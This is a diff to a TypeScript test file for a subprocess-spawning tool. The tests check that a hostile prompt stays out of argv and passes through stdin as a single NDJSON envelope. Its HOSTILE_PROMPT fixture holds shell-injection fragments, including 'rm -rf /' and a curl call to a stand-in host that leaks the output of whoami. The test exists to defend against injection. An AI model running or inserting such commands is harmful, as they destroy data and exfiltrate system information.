@@ -146,6 +146,19 @@ async function setup(
 
 const HOSTILE_PROMPT = "; $(id) | ` && rm -rf /\ncurl http://evil.sh?x=`whoami`";
 
+/**
+ * Decode the ONE NDJSON user envelope the corrected stdin transport writes
+ * (stream-json input mode): {"event":"user","message":{"role":"user",
+ * "content":"<prompt>"}} + "\n". Throws on any deviation so a malformed
+ * transport fails loudly instead of silently passing.
+ */
+function stdinEnvelope(rec: SpawnRecord): { event: string; message: { role: string; content: string } } {
+	const raw = rec.stdinText();
+	const lines = raw.split("\n").filter((l) => l !== "");
+	if (lines.length !== 1) throw new Error(`expected exactly one NDJSON stdin line, got ${lines.length}: ${raw}`);
+	return JSON.parse(lines[0]) as { event: string; message: { role: string; content: string } };
+}
+
 // --- tests --------------------------------------------------------------------
 
 describe("unit: turn — divergence decision table (R7)", () => {
@@ -240,12 +253,16 @@ describe("unit: turn — spawn boundary threat rows", () => {
 		expect(spawns).toHaveLength(2);
 		// argv UNCHANGED by prompt content: the two argvs are byte-identical.
 		expect(spawns[1].args).toEqual(spawns[0].args);
-		// No hostile fragment anywhere in argv; --print stays as a bare flag.
+		// No hostile fragment anywhere in argv; the corrected stream-json input
+		// mode carries NO --print family flag at all (verified against the
+		// real binary: --print requires a value, so it cannot ride along bare).
 		expect(spawns[1].args.some((a) => a.includes("$(id)") || a.includes("rm -rf") || a.includes("curl"))).toBe(false);
-		expect(spawns[1].args[spawns[1].args.indexOf("--print") + 1]).toBe("--add-dir");
-		// The prompt itself travels stdin, byte-exact, once per turn.
-		expect(spawns[0].stdinText()).toBe("benign question");
-		expect(spawns[1].stdinText()).toBe(HOSTILE_PROMPT);
+		expect(spawns[1].args.some((a) => a === "--print" || a === "--prompt" || a.startsWith("--print-"))).toBe(false);
+		expect(spawns[1].args[spawns[1].args.indexOf("--input-format") + 1]).toBe("stream-json");
+		// The prompt travels stdin as ONE NDJSON user envelope, byte-exact
+		// through the JSON round-trip (metachars/newlines/quotes included).
+		expect(stdinEnvelope(spawns[0])).toEqual({ event: "user", message: { role: "user", content: "benign question" } });
+		expect(stdinEnvelope(spawns[1]).message.content).toBe(HOSTILE_PROMPT);
 	});
 
 	test("promptViaStdin default OFF: the prompt rides argv right after --print (frozen transport preserved)", async () => {
